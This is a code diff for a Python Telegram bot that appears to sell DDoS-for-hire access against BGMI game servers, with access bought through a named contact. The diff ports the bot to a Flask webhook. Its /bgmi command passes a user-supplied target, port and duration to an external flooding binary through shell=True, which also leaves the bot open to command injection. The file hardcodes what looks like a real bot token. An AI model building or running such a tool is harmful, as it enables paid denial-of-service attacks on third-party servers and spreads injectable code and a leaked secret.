@@ -1,12 +1,15 @@
-#bgmiddoserpython
+# bgmiddoserpython
 
 import telebot
 import subprocess
 import datetime
 import os
+from flask import Flask, request
+import threading
 
-from keep_alive import keep_alive
-keep_alive()
+# Initialize Flask app for webhooks
+app = Flask(__name__)
+
 # insert your Telegram bot token here
 bot = telebot.TeleBot('6646865765:AAG-R946lS6SCbtS94iNQKBkUk8tgZOwLgA')
 
@@ -19,6 +22,9 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
+# Get Render URL from environment variable
+RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app-name.onrender.com')
+
 # Function to read user IDs from the file
 def read_users():
     try:
@@ -27,36 +33,22 @@ def read_users():
     except FileNotFoundError:
         return []
 
-# Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
-
 # List to store allowed user IDs
 allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["5373224722"]
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+    try:
+        user_info = bot.get_chat(user_id)
+        if user_info.username:
+            username = "@" + user_info.username
+        else:
+            username = f"UserID: {user_id}"
+        
+        with open(LOG_FILE, "a") as file:
+            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+    except Exception as e:
+        print(f"Error logging command: {e}")
 
 # Function to clear logs
 def clear_logs():
@@ -73,16 +65,19 @@ def clear_logs():
 
 # Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
-    if port:
-        log_entry += f" | Port: {port}"
-    if time:
-        log_entry += f" | Time: {time}"
-    
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
+    try:
+        log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+        if target:
+            log_entry += f" | Target: {target}"
+        if port:
+            log_entry += f" | Port: {port}"
+        if time:
+            log_entry += f" | Time: {time}"
+        
+        with open(LOG_FILE, "a") as file:
+            file.write(log_entry + "\n")
+    except Exception as e:
+        print(f"Error recording command logs: {e}")
 
 import datetime
 
@@ -111,7 +106,7 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     elif time_unit == "week" or time_unit == "weeks":
         expiry_date = current_time + datetime.timedelta(weeks=duration)
     elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)
     else:
         return False
     
@@ -129,10 +124,10 @@ def add_user(message):
             duration_str = command[2]
 
             try:
-                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                duration = int(duration_str[:-4])
                 if duration <= 0:
                     raise ValueError
-                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                time_unit = duration_str[-4:].lower()
                 if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                     raise ValueError
             except ValueError:
@@ -167,8 +162,6 @@ def get_user_info(message):
     remaining_time = get_remaining_approval_time(user_id)
     response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
     bot.reply_to(message, response, parse_mode="HTML")
-
-
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -211,7 +204,6 @@ def clear_logs_command(message):
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['clearusers'])
 def clear_users_command(message):
     user_id = str(message.chat.id)
@@ -229,7 +221,6 @@ def clear_users_command(message):
     else:
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
     bot.reply_to(message, response)
- 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -273,7 +264,6 @@ def show_recent_logs(message):
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
         bot.reply_to(message, response)
 
-
 # Function to handle the reply when free users run the /bgmi command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
@@ -285,47 +275,42 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                 response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
-            # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
+            port = int(command[2])
+            time = int(command[3])
             if time > 600:
                 response = "Error: Time interval must be less than 600."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                start_attack_reply(message, target, port, time)
                 full_command = f"./bgmi {target} {port} {time} 500"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
+                bot.reply_to(message, response)
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @mesh213")
 
     bot.reply_to(message, response)
 
-
-# Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -360,14 +345,6 @@ def show_help(message):
 Buy From :- @mesh213
 Official Channel :- https://t.me/+Pw7z83Ju54ljOGFl
 '''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['start'])
@@ -443,15 +420,46 @@ def broadcast_message(message):
 
     bot.reply_to(message, response)
 
+# Flask routes for webhook
+@app.route('/')
+def home():
+    return "Bot is running!"
 
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = telebot.types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return ''
+    else:
+        return 'Invalid content type', 403
 
-#bot.polling()
-while True:
+# Set webhook on startup
+def set_webhook():
     try:
-        bot.polling(none_stop=True)
+        bot.remove_webhook()
+        bot.set_webhook(url=f"{RENDER_URL}/webhook")
+        print("Webhook set successfully!")
     except Exception as e:
-        print(e)
+        print(f"Error setting webhook: {e}")
 
+# Start the webhook in a separate thread
+def start_webhook():
+    set_webhook()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
 
-
-
+if __name__ == '__main__':
+    # Start webhook in background thread
+    webhook_thread = threading.Thread(target=start_webhook)
+    webhook_thread.daemon = True
+    webhook_thread.start()
+    
+    # Keep the main thread alive
+    try:
+        while True:
+            import time
+            time.sleep(10)
+    except KeyboardInterrupt:
+        print("Bot stopped")
